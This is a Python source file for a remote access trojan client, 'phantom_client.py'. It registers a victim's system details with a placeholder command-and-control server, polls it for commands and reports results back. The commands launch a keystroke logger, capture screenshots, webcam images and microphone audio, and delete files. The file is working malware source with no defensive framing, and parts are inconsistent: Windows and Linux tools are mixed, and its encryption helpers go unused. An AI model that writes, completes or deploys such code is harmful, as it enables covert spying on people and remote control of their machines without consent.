# phantom_client.py

import requests
import json
import os
import base64
import subprocess
import socket
import platform
import psutil
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

SERVER_URL = "http://your-c2-server.com:80"

def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return iv + ct

def decrypt_data(encrypted_data, key):
    iv = base64.b64decode(encrypted_data[:24])
    ct = base64.b64decode(encrypted_data[24:])
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

def get_system_info():
    return {
        "os": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "hostname": socket.gethostname()
    }

def send_registration():
    system_info = get_system_info()
    response = requests.post(f"{SERVER_URL}/api/register", json=system_info)
    if response.status_code == 200:
        return response.json().get('session_token')
    else:
        print(f"Registration failed: {response.text}")
        return None

def receive_commands(session_token):
    headers = {'Authorization': f'Bearer {session_token}'}
    response = requests.get(f"{SERVER_URL}/api/commands", headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        print(f"Failed to receive commands: {response.text}")
        return []

def send_command_result(command_id, result, session_token):
    headers = {'Authorization': f'Bearer {session_token}'}
    data = {'command_id': command_id, 'result': result}
    response = requests.post(f"{SERVER_URL}/api/result", json=data, headers=headers)
    if response.status_code != 200:
        print(f"Failed to send command result: {response.text}")

def execute_command(command, args):
    try:
        if command == "keylogger":
            return start_keylogger(args)
        elif command == "screenshot":
            return capture_screenshot(args)
        elif command == "webcam":
            return capture_webcam(args)
        elif command == "mic":
            return record_mic(args)
        elif command == "delete_file":
            return delete_file(args)
        else:
            return f"Unknown command: {command}"
    except Exception as e:
        return str(e)

def start_keylogger(args):
    keylogger_script = """import pythoncom
import pyHook
import win32api
import win32con
import win32gui
import time
import os

log_file = r'C:\\keylog.txt'

def on_keyboard_event(event):
    with open(log_file, 'a') as f:
        f.write(f'{event.Time}: {event.Key}\n')
    return True

hm = pyHook.HookManager()
hm.KeyDown = on_keyboard_event
hm.HookKeyboard()
pythoncom.PumpMessages()
"""
    with open("keylogger.py", "w") as f:
        f.write(keylogger_script)
    subprocess.Popen(["python", "keylogger.py"])
    return "Keylogger started"

def capture_screenshot(args):
    screenshot_path = args.get('path', 'screenshot.png')
    subprocess.run(["scrot", screenshot_path])
    return f"Screenshot captured at {screenshot_path}"

def capture_webcam(args):
    webcam_path = args.get('path', 'webcam.jpg')
    subprocess.run(["fswebcam", webcam_path])
    return f"Webcam capture saved at {webcam_path}"

def record_mic(args):
    mic_path = args.get('path', 'mic.wav')
    subprocess.run(["arecord", "-d", "5", "-f", "cd", mic_path])
    return f"Microphone recording saved at {mic_path}"

def delete_file(args):
    file_path = args.get('path')
    if os.path.exists(file_path):
        os.remove(file_path)
        return f"File {file_path} deleted"
    else:
        return f"File {file_path} not found"

def main():
    session_token = send_registration()
    if not session_token:
        return

    while True:
        commands = receive_commands(session_token)
        for command in commands:
            command_id = command['id']
            cmd = command['command']
            args = command.get('args', {})
            result = execute_command(cmd, args)
            send_command_result(command_id, result, session_token)
        time.sleep(5)

if __name__ == "__main__":
    main()